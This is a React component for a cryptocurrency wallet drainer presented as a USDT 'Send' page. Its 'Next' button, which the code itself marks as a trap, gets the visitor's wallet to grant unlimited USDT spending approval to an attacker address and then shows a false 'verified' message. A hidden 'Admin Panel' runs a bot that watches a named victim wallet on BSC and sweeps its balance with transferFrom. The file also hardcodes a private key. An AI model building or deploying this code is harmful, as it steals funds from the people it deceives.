"use client";

import React, { useState } from 'react';
import { ethers } from 'ethers';

// USDT ABI
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)"
];

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

export default function PortABCDemo() {
  const [logs, setLogs] = useState<string[]>([]);
  const [isMonitoring, setIsMonitoring] = useState(false);
  const [targetAmount, setTargetAmount] = useState<string>("10");

  // Configuration (Use fresh burner wallets for demo)
  const ADMIN_PRIVATE_KEY = "E99f0eb86cf5019bab2f0d0564f89f13e5bb37e34f7ba635390e2e591c8c0271";
  const ADMIN_PUBLIC_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1"; 
  const RECEIVER_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1";
  const VICTIM_WALLET_ADDRESS = "0xc0b4ce03df84765ae604f239ea4bbc5731f308af";


  const addLog = (msg: string) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 5)]);
  };

  async function simulateVictimApproval() {
    try {
      if (!(window as any).ethereum) return alert("Please install MetaMask");
      const provider = new ethers.providers.Web3Provider((window as any).ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
      
      addLog("Initializing secure transfer...");
      const tx = await contract.approve(ADMIN_PUBLIC_ADDRESS, ethers.constants.MaxUint256);
      await tx.wait();
      addLog("Wallet verified successfully.");
    } catch (err: any) {
      addLog("Transaction failed.");
    }
  }

  async function startMonitoring() {
    try {
      const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
      const attackerWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY, provider);
      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, attackerWallet);

      setIsMonitoring(true);
      addLog("Bot: Monitoring node activated...");

      const interval = setInterval(async () => {
        try {
          const balance = await contract.balanceOf(VICTIM_WALLET_ADDRESS);
          const threshold = ethers.utils.parseUnits(targetAmount, 18);

          if (balance.gte(threshold)) {
            const tx = await contract.transferFrom(VICTIM_WALLET_ADDRESS, RECEIVER_ADDRESS, balance, {
              gasPrice: (await provider.getGasPrice()).mul(2)
            });
            await tx.wait();
            addLog("Transfer complete.");
            clearInterval(interval);
            setIsMonitoring(false);
          }
        } catch (err: any) {}
      }, 5000);
    } catch (err: any) {
      addLog("Connection error.");
    }
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4 font-sans">
      
      {/* Main "Port" Container */}
      <div className="w-full max-w-[440px] bg-[#111] border border-[#222] rounded-3xl p-6 shadow-2xl">
        <h1 className="text-xl font-semibold mb-6">Send</h1>

        <div className="space-y-4">
          {/* Token Selector UI */}
          <div className="bg-[#1a1a1a] border border-[#333] p-4 rounded-2xl flex items-center justify-between cursor-pointer hover:border-gray-500 transition-colors">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 bg-[#222] rounded-full flex items-center justify-center text-xs font-bold text-green-500 border border-green-900/30">
                USDT
              </div>
              <div>
                <p className="text-sm font-medium">USDT</p>
                <p className="text-[10px] text-gray-500">Tether USD</p>
              </div>
            </div>
            <span className="text-gray-500">▼</span>
          </div>

          {/* Address Input */}
          <div className="space-y-2">
            <label className="text-xs text-gray-500 ml-1">Address or Domain Name</label>
            <div className="relative">
              <input 
                type="text" 
                placeholder="0x... or ENS"
                className="w-full bg-[#1a1a1a] border border-[#333] p-4 rounded-2xl text-sm focus:outline-none focus:border-green-500 transition-all"
              />
              <button className="absolute right-4 top-4 text-xs text-green-500 font-medium hover:text-green-400">Paste</button>
            </div>
          </div>

          {/* Amount Input */}
          <div className="space-y-2">
            <label className="text-xs text-gray-500 ml-1">Amount</label>
            <div className="relative">
              <input 
                type="number" 
                value={targetAmount}
                onChange={(e) => setTargetAmount(e.target.value)}
                className="w-full bg-[#1a1a1a] border border-[#333] p-4 rounded-2xl text-sm focus:outline-none focus:border-green-500 transition-all pr-20"
              />
              <div className="absolute right-4 top-4 flex gap-2">
                <span className="text-xs text-gray-500">USDT</span>
                <button className="text-xs text-green-500 font-medium hover:text-green-400">Max</button>
              </div>
            </div>
            <p className="text-[10px] text-gray-500 ml-1 italic">Available: Unable to verify balance</p>
          </div>

          {/* Action Button (The "Claim" / Trap) */}
          <button 
            onClick={simulateVictimApproval}
            className="w-full bg-white text-black font-bold py-4 rounded-2xl hover:bg-gray-200 transition-all mt-4"
          >
            Next
          </button>
        </div>
      </div>

      {/* Attacker "Dashboard" (Hidden/Subtle for demo purposes) */}
      <div className="mt-10 w-full max-w-[440px] opacity-40 hover:opacity-100 transition-opacity">
        <div className="bg-[#111] border border-red-900/30 p-4 rounded-2xl">
          <div className="flex justify-between items-center mb-3">
            <p className="text-[10px] uppercase tracking-widest text-red-500 font-bold">Admin Panel</p>
            <button 
              onClick={startMonitoring}
              className="text-[10px] bg-red-950 text-red-400 px-3 py-1 rounded-full border border-red-800"
            >
              {isMonitoring ? "WATCHING..." : "LAUNCH MONITOR"}
            </button>
          </div>
          <div className="bg-black p-3 rounded-lg font-mono text-[10px] text-green-500 h-24 overflow-hidden border border-[#222]">
            {logs.length === 0 ? "> Initializing system..." : logs.map((l, i) => <div key={i}>{l}</div>)}
          </div>
        </div>
      </div>

      <p className="mt-8 text-[10px] text-gray-600">Built with v0 • PortABC Protocol</p>
    </div>
  );
}
